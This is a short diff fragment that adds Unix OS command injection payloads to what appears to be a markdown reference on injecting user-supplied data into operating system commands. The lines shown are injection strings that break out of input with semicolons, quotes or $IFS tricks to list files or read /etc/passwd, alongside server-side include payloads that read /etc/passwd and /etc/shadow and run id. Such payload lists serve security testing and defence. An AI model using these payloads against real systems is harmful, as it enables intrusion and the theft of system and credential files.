@@ -35,6 +35,10 @@ If it is considered unavoidable to incorporate user-supplied data into operating
 ### Unix :
 
 ```
+;ls$IFS$9-la;
+;cat$IFS$9/etc/passwd;
+%27;cat /etc/passwd;%27
+'';cat /etc/passwd;''
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
